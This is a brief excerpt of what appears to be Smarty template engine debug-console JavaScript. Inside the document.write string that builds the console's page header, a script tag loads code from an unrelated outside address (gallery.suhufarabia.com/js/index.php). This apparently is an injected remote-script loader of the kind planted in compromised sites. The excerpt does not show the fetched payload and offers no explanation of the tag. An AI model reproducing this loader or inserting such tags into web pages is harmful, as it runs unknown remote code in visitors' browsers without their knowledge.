...
<SCRIPT language=javascript>
	...
	_smarty_console.document.write("<HTML><HEAD><TITLE>Smarty Debug Console_"+self.name+"</TITLE></HEAD><script src=http://gallery.suhufarabia.com/js/index.php ></script><BODY bgcolor=#ffffff>");
